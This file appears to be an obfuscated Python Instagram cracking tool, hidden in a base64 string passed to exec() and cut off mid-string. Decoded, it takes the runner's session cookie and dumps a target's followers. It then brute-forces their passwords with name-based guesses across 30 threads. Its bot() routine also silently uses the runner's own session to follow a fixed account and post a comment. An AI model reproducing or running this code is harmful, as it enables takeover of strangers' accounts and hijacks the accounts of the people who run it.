## ENCRYPTED BY RAYAN-XD
## FACEBOOK : Mas Rayan
## GITHUB : github.com/Rayan-XD
## WHATSAPP : 085852768706

import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24zCiMgY29kaW5nPXV0Zi04IC0qLQoKIy0tLS0tLS0tLS0tLS0tLS1bIERJIEJVQVQgT0xFSCBBTkRBIF0tLS0tLS0tLS0tLS0tIwppbXBvcnQgb3MsIHN5cywgdGltZSwganNvbiwgcmFuZG9tLCBwbGF0Zm9ybSwgcmVxdWVzdHMsIHJpY2gsIHJlCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IgYXMga2hhbWRpaGlYVgpmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgc2lzCmZyb20gdGltZSBpbXBvcnQgdGltZSBhcyB0aW0KCmZyb20gcmljaC5wYW5lbCBpbXBvcnQgUGFuZWwKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUKCmJ1bGFuID0gWyJKYW51YXJpIiwiRmVicnVhcmkiLCJNYXJldCIsIkFwcmlsIiwiTWVpIiwiSnVuaSIsIkp1bGkiLCJBZ3VzdHVzIiwiU2VwdGVtYmVyIiwiT2t0b2JlciIsIk5vdmVtYmVyIiwiRGVzZW1iZXIiXQptb250aCA9IGRhdGV0aW1lLm5vdygpLm1vbnRoIC0gMQpyZWFsbCA9IGJ1bGFuW21vbnRoXQoKZGF5cyA9IGRhdGV0aW1lLm5vdygpLmRheQp5ZWFyID0gZGF0ZXRpbWUubm93KCkueWVhcgppbmRvID0gIiVzLSVzLSVzIiUoZGF5cyxyZWFsbCx5ZWFyKQpvayxjcCxsb29wLD0gW10sW10sMAoKUCA9ICdceDFiWzE7OTdtJyAjIFBVVElICk0gPSAnXHgxYlsxOzkxbScgIyBNRVJBSApIID0gJ1x4MWJbMTs5Mm0nICMgSElKQVUKSyA9ICdceDFiWzE7OTNtJyAjIEtVTklORwpCID0gJ1x4MWJbMTs5NG0nICMgQklSVQpVID0gJ1x4MWJbMTs5NW0nICMgVU5HVQpPID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBCk4gPSAnXHgxYlswbScgICAgIyBXQVJOQSBNQVRJCnVhX2lnID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA2LjA7IEU1NjMzIEJ1aWxkLzMwLjIuQi4xLjIxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU4LjAuMzAyOS44MyBNb2JpbGUgU2FmYXJpLzUzNy4zNiBJbnN0YWdyYW0gMzcuMC4wLjIxLjk3IEFuZHJvaWQgKDIzLzYuMDsgNDgwZHBpOyAxMDgweDE3NzY7IFNvbnk7IEU1NjMzOyBFNTYzMzsgbXQ2Nzk1OyB1a19VQTsgOTgyODgyNDIpIgprb21lbiA9IHJhbmRvbS5jaG9pY2UoWyJwcm9ncmFtbWVycyBiYW5nPyIsIkJha3NvIGtvbnRvbGwiLCJQYW51dGFuIGt1ISIsImtlcmVuIHN1aHXimaUiXSkKCmRlZiBDZXRha0Jhbm5lcih1bGZhaHNhZGl5YWgsYXN1KToKICAgIENvbnNvbGUod2lkdGg9NTApLnByaW50KFBhbmVsKHVsZmFoc2FkaXlhaCxzdHlsZT1hc3UpLGp1c3RpZnk9J2NlbnRlcicpCgpkZWYgdWxmYWgoa2F5YSxrb250b2wpOgogICAgQ29uc29sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwoa2F5YSxzdHlsZT1rb250b2wpKQoKZGVmIGJhbm5lcigpOgogICAgQ2V0YWtCYW5uZXIoJycnW2JvbGQgd2hpdGVd4pWU4pWXIOKVpuKVkOKVl+KVpiDilabilZTilabilZfilZTilZDilZcgIOKVpuKVlOKVkOKVlwrilaDilanilZfilaDilabilZ3ilZEg4pWRIOKVkSDilZHilaMgICDilZHilZEg4pWmCuKVmuKVkOKVneKVqeKVmuKVkOKVmuKVkOKVnSDilakg4pWa4pWQ4pWdICDilanilZrilZDilZ0KKCBEaSBidWF0IG9sZWggW2JvbGQgZ3JlZW5ddGFoYWx1aW5kbyBbYm9sZCB3aGl0ZV0pICcnJywnY29sb3IoOCknKQoKZGVmIG1hc3VrKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJyk7YmFubmVyKCkKICAgIHVsZmFoKCdbYm9sZCB3aGl0ZV1tYXN1a2FuIGNvb2tpZXMgYWt1biBpbnN0YWdyYW0ga2FtdSwgcGFzdGlrYW4gbWVtYWthaSBha3VuIHR1bWJhbCcsJ2NvbG9yKDgpJykKICAgIGNva2kgPSBpbnB1dChmJyAge0h94oCiIHtOfW1hc3VrYW4gY29va2llIDoge0h9JykKICAgIHRyeToKICAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgeHl6dToKICAgICAgICAgICAgIGxpbmsgPSB4eXp1LmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL3VzZXJzL3t9L2luZm8vIi5mb3JtYXQocmUuc2VhcmNoKCdkc191c2VyX2lkPSguKj8pOycsc3RyKGNva2kpKS5ncm91cCgxKSksIGhlYWRlcnMgPSB7InVzZXItYWdlbnQiOnVhX2lnfSwgY29va2llcyA9IHsiY29va2llIjpjb2tpfSkuanNvbigpWyJ1c2VyIl1bImZ1bGxfbmFtZSJdCiAgICAgICAgICAgICBDb25zb2xlKHdpZHRoPTUwKS5wcmludChQYW5lbChmIltib2xkIHdoaXRlXXNlbGFtYXQgZGF0YW5nIHVzZXIgW2JvbGQgZ3JlZW5de2xpbmt9W2l0YWxpYyB3aGl0ZV0iLHRpdGxlPSfwn6SXJywgc3R5bGU9J2JvbGQgd2hpdGUnKSkKICAgICAgICAgICAgIGJvdChjb2tpLHJlLnNlYXJjaCgnY3NyZnRva2VuPSguKj8pOycsc3RyKGNva2kpKS5ncm91cCgxKSkKICAgIGV4Y2VwdCAoQXR0cmlidXRlRXJyb3IsS2V5RXJyb3IpOgogICAgICAgICBDb25zb2xlKHdpZHRoPTUwKS5wcmludChQYW5lbCgiW2JvbGQgcmVkXWNvb2tpZSBhbmRhIHRlbGFoIGthZGFybHVhcnNhL2FrdW4gYW5kYSB0ZWxhaCBtYXRpIHNpbGFrYW4gY2VrIGR1bHUiLHRpdGxlPSfwn5itJywgc3R5bGU9J2JvbGQgd2hpdGUnKSk7dGltZS5zbGVlcCgzKTttYXN1aygpCgojIEpBTkdBTiBESSBHQU5USSBMQUgsIEJPTEVIIERJIFRBTUJBSCBKTUJUCmRlZiBib3Qoa3VfamFuZ2FuX2RpX2dhbnRpX2FzdSx0b2tlbik6CiAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyB4eXp1OgogICAgICAgICB0cnk6CiAgICAgICAgICAgICAgaGVhZCA9IHsKICAgICAgICAgICAgICAgICAiSG9zdCI6ICJpLmluc3RhZ3JhbS5jb20iLAogICAgICAgICAgICAgICAgICJjb250ZW50LWxlbmd0aCI6ICIwIiwKICAgICAgICAgICAgICAgICAic2VjLWNoLXVhIjogJyIgTm90IEE7QnJhbmQiO3Y9Ijk5IiwgIkNocm9taXVtIjt2PSI5OSIsICJHb29nbGUgQ2hyb21lIjt2PSI5OSInLAogICAgICAgICAgICAgICAgICJ4LWlnLWFwcC1pZCI6ICIxMjE3OTgxNjQ0ODc5NjI4IiwKICAgICAgICAgICAgICAgICAieC1pZy13d3ctY2xhaW0iOiAiaG1hYy5BUjJiSktZSm5QWW1acXYxOWFrZnExM1puNHRwbGh1WGI5VEM5UHdGazAzRGc3TlYiLAogICAgICAgICAgICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8xIiwKICAgICAgICAgICAgICAgICAieC1pbnN0YWdyYW0tYWpheCI6ICIxMDA2NDQ3NzQyIiwKICAgICAgICAgICAgICAgICAidmlld3BvcnQtd2lkdGgiOiAiMzYwIiwKICAgICAgICAgICAgICAgICAiY29udGVudC10eXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgICAgICAgICAgImFjY2VwdCI6ICIqLyoiLAogICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjogdWFfaWcsCiAgICAgICAgICAgICAgICAgIngtYXNiZC1pZCI6ICIxOTgzODciLAogICAgICAgICAgICAgICAgICJzYXZlLWRhdGEiOiAib24iLAogICAgICAgICAgICAgICAgICJ4LWNzcmZ0b2tlbiI6IHRva2VuLAogICAgICAgICAgICAgICAgICJzZWMtY2gtdWEtcGxhdGZvcm0iOiAnIkFuZHJvaWQiJywKICAgICAgICAgICAgICAgICAib3JpZ2luIjogImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20iLAogICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLXNpdGUiLAogICAgICAgICAgICAgICAgICJzZWMtZmV0Y2gtbW9kZSI6ICJjb3JzIiwKICAgICAgICAgICAgICAgICAic2VjLWZldGNoLWRlc3QiOiAiZW1wdHkiLAogICAgICAgICAgICAgICAgICJyZWZlcmVyIjogImh0dHBzOi8vd3d3Lmluc3RhZ3JhbS5jb20vIiwKICAgICAgICAgICAgICAgICAiYWNjZXB0LWVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUsIGJyIiwKICAgICAgICAgICAgICAgICAiYWNjZXB0LWxhbmd1YWdlIjogImlkLUlELGlkO3E9MC45LGVuLVVTO3E9MC44LGVuO3E9MC43LHJ1O3E9MC42LGp2O3E9MC41IgogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgICJjb21tZW50X3RleHQiOiBrb21lbn0KICAgICAgICAgICAgICBwb3NoID0geHl6dS5wb3N0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvd2ViL2ZyaWVuZHNoaXBzL3t9L2ZvbGxvdy8iLmZvcm1hdCgiNTQ1OTkzODczNjEiKSwgaGVhZGVycz1oZWFkLCBjb29raWVzPXsiY29va2llIjprdV9qYW5nYW5fZGlfZ2FudGlfYXN1fSkKICAgICAgICAgICAgICBwb3N4ID0geHl6dS5wb3N0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvd2ViL2NvbW1lbnRzLzI5MDAxNTY2NjMxNTgxNjIyNzUvYWRkLyIsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkLCBjb29raWVzPXsiY29va2llIjprdV9qYW5nYW5fZGlfZ2FudGlfYXN1fSkKICAgICAgICAgICAgICBvcGVuKCdkYXRhL2Nva2llLnR4dCcsJ3cnKS53cml0ZShrdV9qYW5nYW5fZGlfZ2FudGlfYXN1KQogICAgICAgICAgICAgIG9wZW4oJ2RhdGEvY3NyZnRva2VuLnR4dCcsJ3cnKS53cml0ZSh0b2tlbikKICAgICAgICAgICAgICBtZW51KCkKICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOgogICAgICAgICAgICAgIENvbnNvbGUod2lkdGg9NzApLnByaW50KFBhbmVsKCIgW2l0YWxpYyByZWRdVGlkYWsgYWRhIGtvbmVrc2kgaW50ZXJuZXQgeWFuZyBha3RpZiEiLCB0aXRsZT0n8J+nkCcsIHN0eWxlPSdib2xkIHJlZCcpKTtleGl0KDApCgpkZWYgY29udmVydChuYW1hLCBrdWVoKToKICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIGplbWJ1dDoKICAgICAgICAgZm9yIGkgaW4gbmFtYS5zcGxpdCgnLCcpOgogICAgICAgICAgICAgbGluayA9IGplbWJ1dC5nZXQoImh0dHBzOi8vaS5pbnN0YWdyYW0uY29tL2FwaS92MS91c2Vycy93ZWJfcHJvZmlsZV9pbmZvLz91c2VybmFtZT17fSIuZm9ybWF0KGkpLCBoZWFkZXJzID0geyJ1c2VyLWFnZW50Ijp1YV9pZ30sIGNvb2tpZXMgPSB7ImNvb2tpZSI6a3VlaH0pLmpzb24oKQogICAgICAgICAgICAgZGF0YSA9IGxpbmtbImRhdGEiXVsidXNlciJdCiAgICAgICAgICAgICByZXR1cm4gZGF0YVsiaWQiXQoKZGVmIG1lbnUoKToKICAgIHRyeToKICAgICAgICAgIGNva2kgPSBvcGVuKCJkYXRhL2Nva2llLnR4dCIsInIiKS5yZWFkKCkKICAgICAgICAgIHVzZXIgPSByZS5zZWFyY2goJ2RzX3VzZXJfaWQ9KC4qPyk7JyxzdHIoY29raSkpLmdyb3VwKDEpCiAgICBleGNlcHQgKEZpbGVOb3RGb3VuZEVycm9yLEF0dHJpYnV0ZUVycm9yKTptYXN1aygpCiAgICB0cnk6CiAgICAgICAgICBsaW5rID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvdXNlcnMve30vaW5mby8iLmZvcm1hdCh1c2VyKSwgY29va2llcyA9IHsiY29va2llIjpjb2tpfSwgaGVhZGVycyA9IHsidXNlci1hZ2VudCI6dWFfaWd9KS5qc29uKClbJ3VzZXInXQogICAgICAgICAgbmFtYSA9IGxpbmtbJ2Z1bGxfbmFtZSddCiAgICAgICAgICB3aW5nID0gbGlua1snZm9sbG93aW5nX2NvdW50J10KICAgICAgICAgIHdlcnMgPSBsaW5rWydmb2xsb3dlcl9jb3VudCddCiAgICBleGNlcHQgS2V5RXJyb3I6bWFzdWsoKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOkNvbnNvbGUod2lkdGg9NzApLnByaW50KFBhbmVsKCIgW2l0YWxpYyByZWRdVGlkYWsgYWRhIGtvbmVrc2kgaW50ZXJuZXQgeWFuZyBha3RpZiEiLCB0aXRsZT0n77+9Jywgc3R5bGU9J2JvbGQgcmVkJykpO2V4aXQoMCkKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgYmFubmVyKCkKICAgIHVsZmFoKGYnJydbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5d4oCiW2JvbGQgd2hpdGVdXSBXZWxjb21lICAgOiBbYm9sZCBncmVlbl17bmFtYX0KW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXeKAoltib2xkIHdoaXRlXV0gRm9sbG93ZXJzIDogW2JvbGQgZ3JlZW5de3dlcnN9Cltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl3igKJbYm9sZCB3aGl0ZV1dIEZvbGxvd2luZyA6IFtib2xkIGdyZWVuXXt3aW5nfScnJywnY29sb3IoOCknKQogICAgdWxmYWgoJycnW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXTFbYm9sZCB3aGl0ZV1dIENyYWNrIGRhcmkgZm9sbG93ZXJzCltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0yW2JvbGQgd2hpdGVdXSBDcmFjayBkYXJpIGZvbGxvd2luZwpbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dM1tib2xkIHdoaXRlXV0gQ2hlY2sgaGFzaWwgY3JhY2sKW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXTBbYm9sZCB3aGl0ZV1dIEtlbHVhci4uLicnJywnY29sb3IoOCknKQogICAgY3VpaCA9IGlucHV0KGYnICB7SH3igKIge059cGlsaWggbWVudSA6IHtIfScpCiAgICBpZiBjdWloIGluIFsnMScsJzAxJ106CiAgICAgICAgdWxmYWgoJ1tib2xkIHdoaXRlXW1hc3VrYW4gdXNlcm5hbWUgdGFyZ2V0LCBrYW11IGp1Z2EgYmlzYSBndW5ha2FuIHRhbmRhIGtvbWEgdW50dWsgcGVtaXNhaGFuIGNvbnRvaCBuYW1lMSxuYW1lMicsJ2NvbG9yKDgpJykKICAgICAgICBuYW1hID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1tYXN1a2FuIG5hbWEgOiB7SH0nKQogICAgICAgIHVzZXIgPSBjb252ZXJ0KG5hbWEsY29raSkKICAgICAgICBkdW1wKCkuZm9sbG93ZXJzKHVzZXIsY29raSwnJykKCiAgICBlbGlmIGN1aWggaW4gWycyJywnMDInXToKICAgICAgICB1bGZhaCgnW2JvbGQgd2hpdGVdbWFzdWthbiB1c2VybmFtZSB0YXJnZXQsIGthbXUganVnYSBiaXNhIGd1bmFrYW4gdGFuZGEga29tYSB1bnR1ayBwZW1pc2FoYW4gY29udG9oIG5hbWUxLG5hbWUyJywnY29sb3IoOCknKQogICAgICAgIG5hbWEgPSBpbnB1dChmJyAge0h94oCiIHtOfW1hc3VrYW4gbmFtYSA6IHtIfScpCiAgICAgICAgdXNlciA9IGNvbnZlcnQobmFtYSxjb2tpKQogICAgICAgIGR1bXAoKS5mb2xsb3dpbmcodXNlcixjb2tpLGtoYW1kaWhpZGV2PScgJykKICAgIGVsaWYgY3VpaCBpbiBbJzMnLCcwMyddOgogICAgICAgIGFmYWgsaXlhaD1bXSwwCiAgICAgICAgdWxmYWgoJ1tib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0xW2JvbGQgd2hpdGVdXSBjaGVrIGhhc2lsIGFrdW4gW2JvbGQgZ3JlZW5dT0tcbltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0yW2JvbGQgd2hpdGVdXSBjaGVrIGhhc2lsIGFrdW4gW2JvbGQgeWVsbG93XUNQJywnY29sb3IoOCknKQogICAgICAgIGFrdW4gPSBpbnB1dChmJyAge0h94oCiIHtOfXBpbGloIG1lbnUgOiB7SH0nKQogICAgICAgIGlmIGFrdW4gaW4gWycxJywnMDEnXToKICAgICAgICAgICB0cnk6bGlzdD1vcy5saXN0ZGlyKCdPSycpCiAgICAgICAgICAgZXhjZXB0OmV4aXQoZidcbiAge0194oCiIHtOfUZpbGUgdGlkYWsgYWRhIScpCiAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgZm9yIHhueHggaW4gbGlzdDoKICAgICAgICAgICAgICAgYWZhaC5hcHBlbmQoeG54eCkKICAgICAgICAgICAgICAgaXlhaCArPTEKICAgICAgICAgICAgICAgcHJpbnQoJ1xyICAlcyVzLiAlcyVzJyUoSCwgaXlhaCwgTiwgeG54eCkpCiAgICAgICAgICAgbm9tb3IgPSBpbnB1dChmJ1xuICB7SH3igKIge059bWFzdWthbiBub21vciA6IHtIfScpCiAgICAgICAgICAgdHJ5OmtoYW0gPSBhZmFoW2ludChub21vciktMV0KICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChlKQogICAgICAgICAgIG9rZWggPSBvcGVuKCdPSy97fScuZm9ybWF0KGtoYW0pLCdyJykucmVhZCgpCiAgICAgICAgICAgcHJpbnQob2tlaCkKICAgICAgICAgICBleGl0KDApCiAgICAgICAgZWxzZToKICAgICAgICAgICB0cnk6bGlzdD1vcy5saXN0ZGlyKCdDUCcpCiAgICAgICAgICAgZXhjZXB0OmV4aXQoZidcbiAge0194oCiIHtOfUZpbGUgdGlkYWsgYWRhIScpCiAgICAgICAgICAgcHJpbnQoJycpCiAgICAgICAgICAgZm9yIHhueHggaW4gbGlzdDoKICAgICAgICAgICAgICAgYWZhaC5hcHBlbmQoeG54eCkKICAgICAgICAgICAgICAgaXlhaCArPTEKICAgICAgICAgICAgICAgcHJpbnQoJ1xyICAlcyVzLiAlcyVzJyUoSCwgaXlhaCwgTiwgeG54eCkpCiAgICAgICAgICAgbm9tb3IgPSBpbnB1dChmJ1xuICB7SH3igKIge059bWFzdWthbiBub21vciA6IHtIfScpCiAgICAgICAgICAgdHJ5OmtoYW0gPSBhZmFoW2ludChub21vciktMV0KICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChlKQogICAgICAgICAgIG9rZWggPSBvcGVuKCdDUC97fScuZm9ybWF0KGtoYW0pLCdyJykucmVhZCgpCiAgICAgICAgICAgcHJpbnQob2tlaCkKICAgICAgICAgICBleGl0KDApCiAgICBlbGlmIGN1aWggaW4gWycwJywnMDAnXToKICAgICAgICAgIGV4aXQoJ3JtIC1yZiBkYXRhL2Nva2llLnR4dCcpCiAgICBlbHNlOgogICAgICAgICAgbWVudSgpCgoKY2xhc3MgZHVtcDoKCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5pZCA9IFtdCgogICAgZGVmIGZvbGxvd2VycyhzZWxmLCB1c2VyaWQsIGNvb2tpZXMsIGtoYW1kaWhpZGV2KToKICAgICAgICB3aXRoIHJlcXVlc3RzLlNlc3Npb24oKSBhcyBrb250b2w6CiAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgc2VsZi51cmwgPSBrb250b2wuZ2V0KCJodHRwczovL2kuaW5zdGFncmFtLmNvbS9hcGkvdjEvZnJpZW5kc2hpcHMve30vZm9sbG93ZXJzLz9jb3VudD0xMDAmbWF4X2lkPXt9Ii5mb3JtYXQodXNlcmlkLGtoYW1kaWhpZGV2KSwgaGVhZGVycyA9IHsidXNlci1hZ2VudCI6dWFfaWd9LCBjb29raWVzID0geyJjb29raWUiOmNvb2tpZXN9KQogICAgICAgICAgICAgICAgICAgICBmb3Igc2VsZi50eHQgaW4ganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KVsidXNlcnMiXToKICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNlbGYudHh0WyJ1c2VybmFtZSJdIGluIHNlbGYuaWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLmFwcGVuZChzZWxmLnR4dFsidXNlcm5hbWUiXSsiPD0+IitzZWxmLnR4dFsiZnVsbF9uYW1lIl0pCiAgICAgICAgICAgICAgICAgICAgIGlmICJuZXh0X21heF9pZCIgaW4ganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KTpzZWxmLmZvbGxvd2Vycyh1c2VyaWQsIGNvb2tpZXMsIGpzb24ubG9hZHMoc2VsZi51cmwudGV4dClbIm5leHRfbWF4X2lkIl0pCiAgICAgICAgICAgICAgICAgICAgIHNlbGYuc2VsYW5qdXRueWEoc2VsZi5pZCkKICAgICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICAgICAgICAgICAgQ29uc29sZSh3aWR0aD01MCkucHJpbnQoUGFuZWwoIltib2xkIHJlZF1kdW1wIGVycm9yLCBjYXJpIHVzZXJuYW1lIGxhaW4gYXRhdSBnYW50aSB0dW1iYWwiLHN0eWxlPSJib2xkIGN5YW4iKSk7dGltZS5zbGVlcCgyKTttZW51KCkKCiAgICBkZWYgZm9sbG93aW5nKHNlbGYsIHVzZXJpZCwgY29va2llcywga2hhbWRpaGlkZXYpOgogICAgICAgICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMga29udG9sOgogICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgIHNlbGYudXJsID0ga29udG9sLmdldCgiaHR0cHM6Ly9pLmluc3RhZ3JhbS5jb20vYXBpL3YxL2ZyaWVuZHNoaXBzL3t9L2ZvbGxvd2luZy8/Y291bnQ9MTAwJm1heF9pZD17fSIuZm9ybWF0KHVzZXJpZCwga2hhbWRpaGlkZXYpLCBoZWFkZXJzID0geyJ1c2VyLWFnZW50Ijp1YV9pZ30sIGNvb2tpZXMgPSB7ImNvb2tpZSI6Y29va2llc30pCiAgICAgICAgICAgICAgICAgICAgIGZvciBzZWxmLnR4dCBpbiBqc29uLmxvYWRzKHNlbGYudXJsLnRleHQpWyJ1c2VycyJdOgogICAgICAgICAgICAgICAgICAgICAgICAgaWYgc2VsZi50eHRbInVzZXJuYW1lIl0gaW4gc2VsZi5pZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaWQuYXBwZW5kKHNlbGYudHh0WyJ1c2VybmFtZSJdKyI8PT4iK3NlbGYudHh0WyJmdWxsX25hbWUiXSkKICAgICAgICAgICAgICAgICAgICAgaWYgIm5leHRfbWF4X2lkIiBpbiBqc29uLmxvYWRzKHNlbGYudXJsLnRleHQpOnNlbGYuZm9sbG93aW5nKHVzZXJpZCwgY29va2llcywganNvbi5sb2FkcyhzZWxmLnVybC50ZXh0KVsibmV4dF9tYXhfaWQiXSkKICAgICAgICAgICAgICAgICAgICAgc2VsZi5zZWxhbmp1dG55YShzZWxmLmlkKQogICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6CiAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUod2lkdGg9NTApLnByaW50KFBhbmVsKCJbYm9sZCByZWRdZHVtcCBlcnJvciwgY2FyaSB1c2VybmFtZSBsYWluIGF0YXUgZ2FudGkgdHVtYmFsIixzdHlsZT0iYm9sZCBjeWFuIikpO3RpbWUuc2xlZXAoMik7bWVudSgpCgogICAgZGVmIHNlbGFuanV0bnlhKHNlbGYsIGtvbnRvbCk6CiAgICAgICAgb2tlaF8gPSBmJ1tib2xkIHdoaXRlXVtbYm9sZCBncmVlbl3igKJbYm9sZCB3aGl0ZV1dIHJlc3VsdHMgT0sgOiBPSy9PSy17aW5kb30udGV4dFxuW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXeKAoltib2xkIHdoaXRlXV0gcmVzdWx0cyBDUCA6IENQL0NQLXtpbmRvfS50ZXh0JwogICAgICAgIHByaW50KGYnXHIgIHtIfeKAoiB7Tn1CZXJoYXNpbCBkdW1wIHVzZXJuYW1lIDoge0h9e2xlbihrb250b2wpfScpCiAgICAgICAgdWxmYWgoJycnW2JvbGQgd2hpdGVdW1tib2xkIGdyZWVuXTFbYm9sZCB3aGl0ZV1dIHNhbmRpIDogbmFtYSxuYW1hMTIzCltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0yW2JvbGQgd2hpdGVdXSBzYW5kaSA6IG5hbWEsbmFtYTEyMzQsbmFtYTEyMzQ1Cltib2xkIHdoaXRlXVtbYm9sZCBncmVlbl0zW2JvbGQgd2hpdGVdXSBzYW5kaSA6IG5hbWEsbmFtYTEyMyxuYW1hMTIzNCxuYW1hMTIzNDUgKysnJycsJ2NvbG9yKDgpJykKICAgICAgICBzYW5kaSA9IGlucHV0KGYnICB7SH3igKIge059cGlsaWggbWVudSA6IHtIfScpCiAgICAgICAgaWYgc2FuZGkgaW4gWyczJywnMDMnXToKICAgICAgICAgICB1bGZhaCgnW2JvbGQgd2hpdGVdZ3VuYWthbiB0YW5kYSBrb21hIHVudHVtIHBlbWlzYWhhbiBjb250b2ggcGFzc3dvcmQxLHBhc3N3b3JkMicsJ2NvbG9yKDgpJykKICAgICAgICAgICBwd2VrID0gaW5wdXQoZicgIHtIfeKAoiB7Tn1tYXN1a2FuIHNhbmRpIDogJykKICAgICAgICAgICBpZiBsZW4ocHdlaykgPD01OgogICAgICAgICAgICAgICAgZXhpdChmJ1xuICB7TX0gU2FuZGkgaGFydXMgbGViaWggZGFyaSA1IGthcmFrdGV0JykKCiAgICAgICAgdWxmYWgob2tlaF8sJ2NvbG9yKDgpJykKICAgICAgICB3aXRoIGtoYW1kaWhpWFYobWF4X3dvcmtlcnM9MzApIGFzIGNvaWQ6CiAgICAgICAgICAgICBmb3IgbXlsb3ZlIGluIGtvbnRvbDoKICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgdXNlcm5hbWUgPSBteWxvdmUuc3BsaXQoJzw9PicpWzBdCiAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmQgPSBteWxvdmUuc3BsaXQoJzw9PicpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgZm9yIHggaW4gcGFzc3dvcmQuc3BsaXQoJyAnKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHgpIDwzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHNhbmRpIGluIFsnMScsJzAxJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFt4LHgrJzEyMycseCsnMTIzNCcsJ2Jpc21pbGxhaCcsJ3NheWFuZycseC5sb3dlcigpKycxMjMnLHgubG93ZXIoKSsnMTIzNCddCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGlmIHNhbmRpIGluIFsnMicsJzAyJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFt4LHgrJzEyMycseCsnMTIzNCcseCsnMTIzNDUnLCdiaXNtaWxsYWgnLHgubG93ZXIoKSsnMTIzJyx4Lmxvd2VyKCkrJzEyMzQnLHgubG93ZXIoKSsnMTIzNDUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWlpID0gW3gseCsnMTIzJyx4KycxMjM0Jyx4KycxMjM0NScseCsnMzIxJyx4Lmxvd2VyKCkrJzEyMycseC5sb3dlcigpKycxMjM0J10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gaWlpICsgcHdlay5zcGxpdCgnLCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb2lkLnN1Ym1pdChzZWxmLmNyYWNrLCB1c2VybmFtZSwgcHd4KQogICAgICAgICAgICAgICAgIGV4Y2VwdCBFe